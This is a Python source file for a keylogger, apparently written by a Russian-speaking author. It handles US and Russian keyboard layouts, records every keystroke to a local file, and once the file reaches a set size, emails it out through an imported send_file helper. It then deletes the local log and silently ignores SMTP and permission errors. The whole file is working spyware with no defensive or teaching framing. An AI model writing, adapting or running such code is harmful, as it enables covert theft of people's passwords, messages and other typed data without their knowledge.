import os
import keyboard
from language_dict import dict_us_for_ru, dict_ru_for_us
from settings import get_input_language, pressing_key, size_file, size_my_file, send_file
import smtplib
from threading import Thread, Event


class ThreadSendFile(Thread):
    """Класс отдельного потока для отправки email"""

    def __init__(self, stop_event, size_file_result):
        Thread.__init__(self)
        self.stop_event = stop_event
        self.size_my_file = size_file_result

    def run(self):
        """Отправка файла на email в отдельном потоке"""
        result = ''
        while not self.stop_event.is_set():
            try:
                result = send_file()
            except (smtplib.SMTPSenderRefused, smtplib.SMTPAuthenticationError):
                pass
            finally:
                if result == 'no':
                    self.size_my_file += 100
                os.remove('keylloger_file.txt')
            self.stop_event.set()


class MyKeyboardListener:
    """Основной класс"""

    def __init__(self, start_language):
        self.start_language = start_language
        self.language_flag_us = False
        self.language_flag_ru = False
        self.size_my_file = size_my_file
        if self.start_language == 1033:
            self.language_flag_us = True
        else:
            self.language_flag_ru = True
        self.char_list = []

    def get_on_press_key(self, event):
        """Получение нажатой клавиши"""
        if self.start_language == 1033:
            pressing_key(event, dict_us_for_ru, language_flag=self.language_flag_us, add_char=self.char_list)

        elif self.start_language == 1049:
            pressing_key(event, dict_ru_for_us, language_flag=self.language_flag_ru, add_char=self.char_list)

        if len(self.char_list) != 0:
            self.write_to_file()
        if size_file() >= self.size_my_file:
            try:
                if os.path.exists('keylloger_file.txt'):
                    stop_event = Event()
                    thread = ThreadSendFile(stop_event=stop_event, size_file_result=size_my_file)
                    thread.start()
                    thread.join()
            except PermissionError:
                pass

    def write_to_file(self):
        """Записывает данные в файл"""
        with open('keylloger_file.txt', 'a') as my_file:
            text = ''.join(self.char_list)
            text = text.replace('space', ' ').replace('shift', '').replace('enter', '\n').replace('ctrl', '').replace(
                'alt', '').replace('tab', '    ').replace('caps lock', '')
            my_file.write(text)
        self.char_list.clear()

    def switch_language_flag(self):
        """Меняет способ получения клавишь(меняет флаг на противоположный)"""
        if not self.language_flag_us:
            self.language_flag_us = True
            self.language_flag_ru = False
        else:
            self.language_flag_us = False
            self.language_flag_ru = True


if __name__ == '__main__':
    start = get_input_language()
    listener = MyKeyboardListener(start)
    keyboard.add_hotkey('ctrl+shift', listener.switch_language_flag)
    keyboard.add_hotkey('alt+shift', listener.switch_language_flag)
    keyboard.on_press(listener.get_on_press_key)
    keyboard.wait()
